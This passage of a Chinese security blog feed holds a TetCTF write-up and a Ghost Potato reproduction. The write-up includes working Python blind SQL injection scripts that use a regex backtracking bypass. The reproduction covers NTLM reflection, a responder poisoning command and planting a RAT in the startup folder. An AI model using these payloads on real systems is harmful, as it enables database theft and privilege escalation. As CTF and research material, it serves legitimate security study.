alt="566b609db0474315721205518e7e4e93"></p><p>实现的逻辑：</p><p><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/605EE971-D504-4731-B4BA-C4B8BDF63713.png" alt="eb724db565d3c8255c3d8b9ade179acd"><br><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/E1B60502-6989-4F0A-A338-404B8A8E71FD.png" alt="ca72a4112bd087f4b4c3727c6b5c37d7"></p><p><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/4ACCE8DB-7A46-4B23-9F58-F172EC493CC0.png" alt="92445e4789f52d1fd55064d67a20423c"></p><p><img src="/DotNetToJScript &amp;&amp; GadgetToJScript.resources/A1092ACD-30F9-4844-9E4A-A56F118039C0.png" alt="4a811eba7e0f586e9c45951578db8053"></p><p>再后来就是直接替换数据，生成目标文件</p><h2 id="0x03-Links🔗"><a href="#0x03-Links🔗" class="headerlink" title="0x03 Links🔗"></a>0x03 Links🔗</h2><p><a href="https://github.com/tyranid/DotNetToJScript" target="_blank" rel="noopener">https://github.com/tyranid/DotNetToJScript</a><br><a href="https://github.com/Cn33liz/StarFighters" target="_blank" rel="noopener">https://github.com/Cn33liz/StarFighters</a><br><a href="https://github.com/med0x2e/GadgetToJScript" target="_blank" rel="noopener">https://github.com/med0x2e/GadgetToJScript</a><br><a href="https://3xpl01tc0d3r.blogspot.com/2020/02/gadgettojscript-covenant-donut.html" target="_blank" rel="noopener">https://3xpl01tc0d3r.blogspot.com/2020/02/gadgettojscript-covenant-donut.html</a><br><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8JS%E5%8A%A0%E8%BD%BD.Net%E7%A8%8B%E5%BA%8F/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8JS%E5%8A%A0%E8%BD%BD.Net%E7%A8%8B%E5%BA%8F/</a><br><a href="https://3gstudent.github.io/3gstudent.github.io/GadgetToJScript%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/GadgetToJScript%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2020-03-10 17:48:22&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;/wallpaper/girl_umbrella_rain.jpg&quot; alt&gt;&lt;/p&gt;
&lt;
      
    
    </summary>
    
      <category term="Red-Team Tricks" scheme="http://patrilic.top/categories/Red-Team-Tricks/"/>
    
    
      <category term="DotNet" scheme="http://patrilic.top/tags/DotNet/"/>
    
  </entry>
  
  <entry>
    <title>TetCTF - Secure System Write-up</title>
    <link href="http://patrilic.top/2020/01/09/TetCTF%20-%20Secure%20System%20Write-up/"/>
    <id>http://patrilic.top/2020/01/09/TetCTF - Secure System Write-up/</id>
    <published>2020-01-09T06:49:00.000Z</published>
    <updated>2020-03-18T09:46:39.603Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2020-01-09 14:49:00<br><img src="/wallpaper/vocaloid.jpg" alt></p></blockquote><h2 id="0x00-题目描述"><a href="#0x00-题目描述" class="headerlink" title="0x00 题目描述"></a>0x00 题目描述</h2><p>题目链接： <a href="http://45.77.240.178:8002/" target="_blank" rel="noopener">http://45.77.240.178:8002/</a></p><p><img src="/TetCTF - Secure System Write-up.resources/B29EA8C6-2D14-41CF-99C1-FF9B0EDFB058.png" alt="ea89ccbacf44ccaeee8376d3d5bfb923"></p><h2 id="0x01-Write-up"><a href="#0x01-Write-up" class="headerlink" title="0x01 Write-up"></a>0x01 Write-up</h2><p>题目给出的源码只有一个index.php文件<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'dbconnect.php'</span>);</span><br><span class="line">$flag = mysqli_query($conn,<span class="string">"SELECT * FROM xxxxxxxxxxxxxxxxxxx"</span>)-&gt;fetch_assoc()[<span class="string">'yyyyyyyyyyyyyyyyyyyy'</span>]; <span class="comment">//Sorry It's our secret, can't share</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;center&gt;</span><br><span class="line">Security Check!!! Please enter your ID to prove who are you !!!:</span><br><span class="line">&lt;form action=<span class="string">"index.php"</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">        &lt;input name=<span class="string">"id"</span> value=<span class="string">""</span> /&gt;&lt;br&gt;</span><br><span class="line">        &lt;input type=<span class="string">"submit"</span> value=<span class="string">"Submit"</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'id'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">'id'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/and|or|in|if|case|sleep|benchmark/is'</span> , $_POST[<span class="string">'id'</span>])) </span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">'Tet nhat ai lai hack nhau :(, very dangerous key word'</span>); </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">elseif</span> (preg_match(<span class="string">'/order.+?by|union.+?select/is'</span> , $_POST[<span class="string">'id'</span>])) </span><br><span class="line">        &#123; </span><br><span class="line">                <span class="keyword">die</span>(<span class="string">'Tet nhat ai lai hack nhau :(, very dangerous statement'</span>); </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">                $user = mysqli_query($conn,<span class="string">"SELECT * FROM users WHERE id="</span>.$_POST[<span class="string">'id'</span>])-&gt;fetch_assoc()[<span class="string">'username'</span>]; </span><br><span class="line">                <span class="keyword">if</span>($user!==<span class="string">'admin'</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">'Hello '</span>.htmlentities($user);</span><br><span class="line">                        <span class="keyword">if</span>($user===<span class="string">'admin'</span>)</span><br><span class="line">                        &#123;</span><br><span class="line">                                <span class="keyword">echo</span> <span class="string">'This can\'t be =]] Just put here for fun lul'</span>;</span><br><span class="line">                                <span class="keyword">die</span>($flag);</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>一看源码就知道是道纯粹的SQL注入题目, 而且获得flag的形式应该是直接从数据库中注出来</p><p>因为过滤了sleep以及benchmark，所以应该是布尔盲注<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="number">1</span> &amp;&amp; <span class="keyword">ord</span>(<span class="keyword">substr</span>(<span class="keyword">DATABASE</span>(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">104</span>;</span><br></pre></td></tr></table></figure></p><p>但是ord的or被过滤了，这里可以使用<code>convv(hex())</code>或者<code>ascii</code><br><img src="/TetCTF - Secure System Write-up.resources/96B675BE-34F7-4F19-B189-3981EFF17340.png" alt="c91fcfd31936474702b02abb961fbca8"></p><p>先获取<code>database()</code>试试<br><img src="/TetCTF - Secure System Write-up.resources/4ED56111-7CBB-42C9-95B5-5243D32628AA.png" alt="f2f429a807a9fb530ec8f2fad4141522"></p><p>判断出database长度为10<br><img src="/TetCTF - Secure System Write-up.resources/24D8112D-2B2F-4583-9DE2-F57F5DA54EE7.png" alt="7782176063dc8cf8b343b49fb35cafd2"></p><p>写个小脚本跑一下数据库名<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2020-01-09 11:31</span></span><br><span class="line"><span class="comment"># @Author  : Patrilic</span></span><br><span class="line"><span class="comment"># @FileName: sql_dbs.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://45.77.240.178:8002/index.php"</span></span><br><span class="line">proxy = &#123;<span class="string">"http"</span>:<span class="string">"127.0.0.1:8000"</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">database_name = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i  <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">11</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">128</span>):</span><br><span class="line">        payload = &#123;</span><br><span class="line">            <span class="string">"id"</span>:<span class="string">"(ascii(substr(database(),&#123;&#125;,10))=&#123;&#125;)+1"</span>.format(i, j)</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url, payload)</span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'guest'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            database_name += chr(j)</span><br><span class="line">            print(database_name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># owl_donkey</span></span><br></pre></td></tr></table></figure></p><p><img src="/TetCTF - Secure System Write-up.resources/31624890-45DB-4217-9315-E602A17EC5B8.png" alt="85c5dd1254be513f98f349eb7cd47fb8"></p><p>注表名的时候又遇到了问题，information_schema和mysql.innodb_table_stats都需要使用<code>in</code>，这里需要拿<br><code>sys.x$schema_flattened_keys</code>绕过</p><p>关于<code>sys.x$schema_flattened_keys</code>,可以看它的组成语句<br><a href="https://github.com/mysql/mysql-sys/blob/master/views/i_s/x_schema_flattened_keys.sql" target="_blank" rel="noopener">https://github.com/mysql/mysql-sys/blob/master/views/i_s/x_schema_flattened_keys.sql</a></p><p>同样的，也可以使用 <code>sys.x$schema_table_statistics</code>，这个更好，因为sys.x$schema_flattened_keys是基于index的，这个的话，会把<code>sys.x$schema_flattened_keys</code>表中没有的也列出来</p><p><a href="https://dev.mysql.com/doc/refman/5.7/en/sys-schema-table-statistics.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/5.7/en/sys-schema-table-statistics.html</a></p><p><img src="/TetCTF - Secure System Write-up.resources/56B35F7D-EA38-4663-ACA0-1FC4244D2908.png" alt="2b07bdb34413f05f7ca6eb4b030e607d"></p><p><img src="/TetCTF - Secure System Write-up.resources/79AD0B24-8E8C-41A6-B72D-0944D8045E6C.png" alt="8fb416e975b51f8df333dd0484f56f1c"></p><p><img src="/TetCTF - Secure System Write-up.resources/007A7C9A-7EFE-488D-B41A-017133728593.png" alt="6e9e8286efbf5b718063109b83239aac"></p><p><img src="/TetCTF - Secure System Write-up.resources/6B884E33-3C68-4377-B756-B151E6162017.png" alt="9242e3a76332820539e37d6cb5ae2834"></p><p><img src="/TetCTF - Secure System Write-up.resources/007A7C9A-7EFE-488D-B41A-017133728593.png" alt="6e9e8286efbf5b718063109b83239aac"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2020-01-09 12:23</span></span><br><span class="line"><span class="comment"># @Author  : Patrilic</span></span><br><span class="line"><span class="comment"># @FileName: sql_tbs.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://45.77.240.178:8002/index.php"</span></span><br><span class="line">proxy = &#123;<span class="string">"http"</span>:<span class="string">"127.0.0.1:8000"</span>&#125;</span><br><span class="line"></span><br><span class="line">chars = <span class="string">'0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!@#$%^&amp;*()_+&#123;&#125;-='</span></span><br><span class="line">table_name = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i  <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">26</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> chars:</span><br><span class="line">        payload=&#123;</span><br><span class="line">            <span class="string">'id'</span>: <span class="string">'2 &amp;&amp; ascii(substr((select table_name from sys.x$schema_table_statistics where table_schema=database() limit 1,1),&#123;&#125;,25))=ascii("&#123;&#125;")'</span>.format(i, j)&#125;</span><br><span class="line">        res = requests.post(url, headers=&#123;<span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded'</span>&#125;, data=payload, proxies = proxy)</span><br><span class="line">        <span class="comment"># res = requests.post(url, payload)</span></span><br><span class="line">        print(payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'guest'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            print(payload)</span><br><span class="line">            table_name += chr(j)</span><br><span class="line">            print(table_name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#Th1z_Fack1n_Fl4444g_Tabl3</span></span><br></pre></td></tr></table></figure><p>最后需要用到不用列名的注入<br><img src="/TetCTF - Secure System Write-up.resources/8432F298-8697-47E9-BE14-878DFC881031.png" alt="a76496e56389cb4c52c6398954e74c6c"></p><p>但是过滤了union…select<br>可以通过利用pcre的正则回朔限制-&gt; <a href="https://www.php.net/manual/en/pcre.configuration.php" target="_blank" rel="noopener">https://www.php.net/manual/en/pcre.configuration.php</a></p><p><img src="/TetCTF - Secure System Write-up.resources/F66E9D29-E130-42A6-A1B6-8EF052EDA480.png" alt="a680d61975012035e830da60c6570f88"></p><p><img src="/TetCTF - Secure System Write-up.resources/64083455-674F-45B7-95F1-75E9802FCD3B.png" alt="07bdea7497a2c62c8d713e3694d4d219"></p><p><img src="/TetCTF - Secure System Write-up.resources/F4E3B33D-6A21-4F47-8074-D4A04B97F4F3.png" alt="0e569c73134f02f2a88532cee36b032f"><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2020-01-09 14:16</span></span><br><span class="line"><span class="comment"># @Author  : Patrilic</span></span><br><span class="line"><span class="comment"># @FileName: sql_flag.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://45.77.240.178:8002/index.php"</span></span><br><span class="line">payload = <span class="string">'union/*'</span>+<span class="string">'a'</span>*<span class="number">1000000</span>+<span class="string">'*/select 1,(select b from (select 1 as a, 2 as b union/*'</span>+<span class="string">'a'</span>*<span class="number">1000000</span>+<span class="string">'*/select * from Th1z_Fack1n_Fl4444g_Tabl3)c limit 1,1),3-- -'</span></span><br><span class="line"></span><br><span class="line">r = requests.post(url,headers=&#123;<span class="string">'Content-Type'</span>:<span class="string">'application/x-www-form-urlencoded'</span>&#125;,data=&#123;<span class="string">'id'</span>:<span class="string">'-2 &#123;&#125;'</span>.format(payload)&#125;)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure></p><p><img src="/TetCTF - Secure System Write-up.resources/6462EED4-7128-4E75-9148-7E067338D346.png" alt="299159676ac7baa72c532e811c662aa5"></p><h2 id="0x02-其他解法"><a href="#0x02-其他解法" class="headerlink" title="0x02 其他解法"></a>0x02 其他解法</h2><p>如果不用管正则回朔的话，可以使用这个payload<br><img src="https://miro.medium.com/max/2946/1*MWzWtiWrwUBXJ_IPgG5dZw.png" alt="c0f735cf4c0143d7a7f22e9e3a41c996.png"><br>链接: <a href="https://medium.com/@terjanq/blind-sql-injection-without-an-in-1e14ba1d4952" target="_blank" rel="noopener">https://medium.com/@terjanq/blind-sql-injection-without-an-in-1e14ba1d4952</a></p><p><img src="/TetCTF - Secure System Write-up.resources/D9FB03F7-73AB-4245-B66A-E84AF090B105.png" alt="d8102c59d29372db6ba37a26ff4d1ed9"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2020-01-09 14:49:00&lt;br&gt;&lt;img src=&quot;/wallpaper/vocaloid.jpg&quot; alt&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x00-题目
      
    
    </summary>
    
      <category term="Write-up" scheme="http://patrilic.top/categories/Write-up/"/>
    
    
      <category term="SQLi" scheme="http://patrilic.top/tags/SQLi/"/>
    
  </entry>
  
  <entry>
    <title>Ghost Potato 复现</title>
    <link href="http://patrilic.top/2020/01/08/Ghost%20Potato%20%E5%A4%8D%E7%8E%B0/"/>
    <id>http://patrilic.top/2020/01/08/Ghost Potato 复现/</id>
    <published>2020-01-08T06:11:00.000Z</published>
    <updated>2020-01-15T07:25:23.054Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2020-01-08 14:11:00<br><img src="/wallpaper/8898355.png" alt></p></blockquote><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>11月份的时候shenaniganslabs发了博文，讲了关于CVE-2019-1384的漏洞详情<br><a href="https://shenaniganslabs.io/2019/11/12/Ghost-Potato.html" target="_blank" rel="noopener">https://shenaniganslabs.io/2019/11/12/Ghost-Potato.html</a></p><p>这同样是一个Potato系列的漏洞，简单来说就是绕过了MS08-068的修补方案，实现本机的NTLM反射，达到提权的目的。</p><h2 id="0x01-NTLM-认证过程"><a href="#0x01-NTLM-认证过程" class="headerlink" title="0x01 NTLM 认证过程"></a>0x01 NTLM 认证过程</h2><p>要搞清楚NTLM反射，首先来回顾一下NTLM的认证过程。</p><p>NTLM认证基于C/S验证机制，由三种消息组成: 协商，质询，验证</p><p>type1：协商 </p><p>主要是客户端向服务器客户端支持和服务器请求的功能列表<br><img src="/Ghost Potato 复现.resources/F907D21A-6198-4A06-BE96-D67FE0F0D94D.png" alt="8a9adf48b220765148159420352b0926"></p><p><img src="/Ghost Potato 复现.resources/CFA2D1D3-F936-415C-8CDF-D2B96E4387C4.png" alt="5fe17581a5f18b94e056372f40a143b3"></p><p>type2: 质询</p><p>服务器向客户端发送服务器支持的功能列表，并且同时发送一个16位的Challenge， 并且同时发送服务器的各类信息于<code>Target Info</code>字段<br><img src="/Ghost Potato 复现.resources/FDDC5458-4604-4EDD-9229-C41409298B7A.png" alt="17a05d76aea975ebc761066fb353203a"><br><img src="/Ghost Potato 复现.resources/10DB989A-A63E-407A-8E68-65D16E8F9F1E.png" alt="1fc4e34dc48fe639178e8635e331b489"></p><p>type3: 验证</p><p>客户端收到Challenge后，使用自身的NTLM Hash加密Challenge得到Response，将Response发送给服务端.然后服务端在本地调用用户NTLM hash加密Challenge后，与Response进行对比。<br><img src="/Ghost Potato 复现.resources/524712DF-E16A-47B1-8C8C-84AF4B784EB2.png" alt="325b4135ce785efc07a203672063569d"><br><img src="/Ghost Potato 复现.resources/F0CDF5B0-E83B-430A-ADC9-87D6E2D07DBD.png" alt="65e13805817ab41463a35466c17db3cd"></p><h2 id="0x02-ms08-068"><a href="#0x02-ms08-068" class="headerlink" title="0x02 ms08-068"></a>0x02 ms08-068</h2><p><img src="/Ghost Potato 复现.resources/045D32EE-D9C4-4643-B428-E94448F1F328.png" alt="1b4ac4b788cb76a6e198f0892b450ff5"></p><p>这里需要看一个函数<a href="https://docs.microsoft.com/en-us/windows/win32/api/sspi/nf-sspi-initializesecuritycontexta" target="_blank" rel="noopener">InitializeSecurityContextA</a></p><p>这个函数属于<code>sspi.h</code>, 关于SSP的作用就不再赘述了</p><p>函数主体：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">SECURITY_STATUS SEC_ENTRY <span class="title">InitializeSecurityContextA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  PCredHandle    phCredential,</span></span></span><br><span class="line"><span class="function"><span class="params">  PCtxtHandle    phContext,</span></span></span><br><span class="line"><span class="function"><span class="params">  SEC_CHAR       *pszTargetName,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">unsigned</span> <span class="keyword">long</span>  fContextReq,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">unsigned</span> <span class="keyword">long</span>  Reserved1,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">unsigned</span> <span class="keyword">long</span>  TargetDataRep,</span></span></span><br><span class="line"><span class="function"><span class="params">  PSecBufferDesc pInput,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">unsigned</span> <span class="keyword">long</span>  Reserved2,</span></span></span><br><span class="line"><span class="function"><span class="params">  PCtxtHandle    phNewContext,</span></span></span><br><span class="line"><span class="function"><span class="params">  PSecBufferDesc pOutput,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">unsigned</span> <span class="keyword">long</span>  *pfContextAttr,</span></span></span><br><span class="line"><span class="function"><span class="params">  PTimeStamp     ptsExpiry</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure></p><p>可以看到存在一个pszTargetName参数， ms08-068的修复方案也就是利用这个参数进行的<br><img src="/Ghost Potato 复现.resources/115F192E-A60E-4479-8895-32F04A94AB78.png" alt="29288cfa28f66aba44e0ab9f73a517f1"></p><p>当我们存在两个主机进行SMB通信时，A向B发送了type1请求，同时他将自己的pszTargetName设置为<code>cifs/B</code>, 当拿到type2的challenge时，向lsass进程中写入缓存 -&gt; (Challenge,<code>cifs/B</code>)。 而后A向B发送type3，B收到response后，会到lsass中去寻找是否存在缓存(Challenge,<code>cifs/B</code>), 因为只有A主机写入了缓存，所以如果A和B不是同一个主机，那么肯定B主机不存在缓存，认证成功。</p><h2 id="0x03-cve-2019-1384"><a href="#0x03-cve-2019-1384" class="headerlink" title="0x03 cve-2019-1384"></a>0x03 cve-2019-1384</h2><p>这个漏洞主要是绕过了缓存的限制，因为lsass中的缓存(Challenge,<code>cifs/B</code>),在300s后会自动消失</p><p>利用流程：<br><img src="/Ghost Potato 复现.resources/3EB9D266-B198-4E2D-B772-8B40453DCB8A.png" alt="6f8b3a6d4a3d8162d7f0038da8ea9c8d"></p><p><img src="/Ghost Potato 复现.resources/340E6D7C-E3A5-422A-ADDB-CE4A88B1B4FB.png" alt="a4cc7175c7336fa2ce112be224e599ba"></p><p>经过315s后，再发送type3, 那么到时候lsass中的缓存已经消除，可以成功认证本机器</p><h2 id="0x04-漏洞复现"><a href="#0x04-漏洞复现" class="headerlink" title="0x04 漏洞复现"></a>0x04 漏洞复现</h2><p>作者原文中提供的Poc: <a href="https://shenaniganslabs.io/files/impacket-ghostpotato.zip" target="_blank" rel="noopener">impacket-ghostpotato</a></p><p>由于他给的Poc只支持HTTP协议，所以我们使用IE浏览器进行访问即可<br>配合responder的LLMNR投毒<br><code>responder -I eth0 --lm</code><br><img src="/Ghost Potato 复现.resources/8B3E0429-8C31-4B51-A041-B53AA33DFED2.png" alt="e7d97909c09c6df2e635a79f42d008fa"></p><p><img src="/Ghost Potato 复现.resources/931621A9-E083-432B-995A-E8456273F419.png" alt="4b70a636a099df1df6edaa589a7b502a"></p><p><img src="/Ghost Potato 复现.resources/BC25ADA7-5E50-4761-90F1-2CBFAAA8A1D8.png" alt="4293fc2ae9929ce256a093d83abd5268"></p><p>上传rat文件到WIndows启动目录，用户下次登录时自启动<br><img src="/Ghost Potato 复现.resources/57058489-892B-40D3-AB6D-C19EDC7412FB.png" alt="38bfbc3c2bfbf0f45b824b6925c00bcc"></p><p><img src="/Ghost Potato 复现.resources/14664359-3329-4C68-A03A-8AD724A586A5.png" alt="c7d00b80d814559146c3e304fad08fcd"><br><img src="/Ghost Potato 复现.resources/BFA561E6-5967-4E97-A1B8-561A3FFC5BC4.png" alt="0f90f41771ce981e210e0e55f5a0df6e"></p><p>Poc提供两个上传路径<br><img src="/Ghost Potato 复现.resources/C5DF6644-AD4F-47E3-AD26-55318D0F2C63.png" alt="4274fad42facd59cf6937337a452c9d9"></p><h2 id="0x05-引用链接🔗"><a href="#0x05-引用链接🔗" class="headerlink" title="0x05 引用链接🔗"></a>0x05 引用链接🔗</h2><p><a href="https://daiker.gitbook.io/windows-protocol/ntlm-pian/4" target="_blank" rel="noopener">https://daiker.gitbook.io/windows-protocol/ntlm-pian/4</a><br><a href="https://shenaniganslabs.io/2019/11/12/Ghost-Potato.html" target="_blank" rel="noopener">https://shenaniganslabs.io/2019/11/12/Ghost-Potato.html</a><br><a href="https://support.microsoft.com/kb/957097/" target="_blank" rel="noopener">https://support.microsoft.com/kb/957097/</a><br><a href="http://davenport.sourceforge.net/ntlm.html" target="_blank" rel="noopener">http://davenport.sourceforge.net/ntlm.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2020-01-08 14:11:00&lt;br&gt;&lt;img src=&quot;/wallpaper/8898355.png&quot; alt&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x00-前言&quot;
      
    
    </summary>
    
      <category term="内网渗透" scheme="http://patrilic.top/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="Potato" scheme="http://patrilic.top/tags/Potato/"/>
    
  </entry>
  
  <entry>
    <title>iSoonLab.org Write-up</title>
    <link href="http://patrilic.top/2019/12/12/iSoonLab.org%20Write-up/"/>
    <id>http://patrilic.top/2019/12/12/iSoonLab.org Write-up/</id>
    <published>2019-12-12T06:32:22.000Z</published>
    <updated>2019-12-12T07:26:41.417Z</updated>
    
